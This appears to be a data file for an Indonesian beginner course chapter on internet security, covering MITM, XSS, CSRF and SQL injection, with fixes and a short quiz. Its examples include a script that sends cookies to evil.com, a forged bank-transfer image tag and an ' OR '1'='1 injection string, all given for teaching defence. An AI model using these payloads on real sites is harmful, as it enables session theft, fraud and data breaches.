export const chapter = {
  slug: "internet-security-intro",
  title: "Keamanan Internet Dasar",
  description: "Pahami ancaman keamanan internet: MITM, XSS, CSRF, SQL Injection, dan cara melindunginya.",
  icon: "SiInternetexplorer",
  color: "#0076D6",
  difficulty: "Beginner",
  estimatedReadingTime: 15,
  prerequisites: ["internet-https"],
  tags: ["internet", "security", "ssl", "encryption"],
  order: 15,
  isPublished: true,
  updatedAt: "2026-07-29",

  content: `
## Kenapa Keamanan Internet Penting?

Setiap hari ada **30.000+ website di-hack**. Keamanan bukan fitur, tapi **fondasi**.

## Ancaman Umum

| Ancaman | Deskripsi | Dampak |
|---------|-----------|--------|
| **MITM** | Man-in-the-Middle (penyadapan) | Data dicuri |
| **XSS** | Cross-Site Scripting | Suntik script jahat |
| **CSRF** | Cross-Site Request Forgery | Aksi tanpa izin |
| **SQL Injection** | Suntik query SQL | Database bocor |
| **DDoS** | Distributed Denial of Service | Server down |
| **Phishing** | Website palsu | Credential dicuri |

## Man-in-the-Middle (MITM)

\`\`\`
User ────▶ Hacker ────▶ Server
         (menyadap)
         
Solusi: HTTPS (enkripsi end-to-end)
\`\`\`

## XSS (Cross-Site Scripting)

\`\`\`html
<!-- Attacker input di form komentar -->
<script>fetch('https://evil.com?cookie=' + document.cookie)</script>

<!-- ❌ Berbahaya jika langsung dirender -->
<div>{{ userComment }}</div>

<!-- ✅ Aman: escape HTML -->
<div>{{ escapeHTML(userComment) }}</div>
\`\`\`

## CSRF (Cross-Site Request Forgery)

\`\`\`html
<!-- Di website jahat -->
<img src="https://bank.com/transfer?to=hacker&amount=1000000" />

<!-- Solusi: CSRF Token -->
<form>
    <input type="hidden" name="csrf_token" value="unique-token">
</form>
\`\`\`

## SQL Injection

\`\`\`sql
-- Input user: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';

-- Solusi: Parameterized Query
SELECT * FROM users WHERE username = ? AND password = ?;
\`\`\`

## Best Practices

\`\`\`
✅ HTTPS everywhere
✅ Validasi & sanitasi input
✅ Parameterized queries (hindari SQL injection)
✅ CSRF token
✅ Content Security Policy (CSP) header
✅ Escape output (hindari XSS)
✅ Rate limiting (cegah brute force)
✅ Keep dependencies updated
✅ Security headers (Helmet)
\`\`\`
  `,

  quiz: [
    { question: "MITM?", options: ["Virus", "Man-in-the-Middle (penyadapan)", "DDoS", "Spam"], correctAnswer: 1 },
    { question: "XSS?", options: ["Cross-Site Scripting (suntik script)", "Database error", "Network attack", "File upload"], correctAnswer: 0 },
    { question: "SQL Injection dicegah dengan?", options: ["HTTPS", "Parameterized queries", "CSS", "HTML escaping"], correctAnswer: 1 }
  ],

  codeExamples: []
};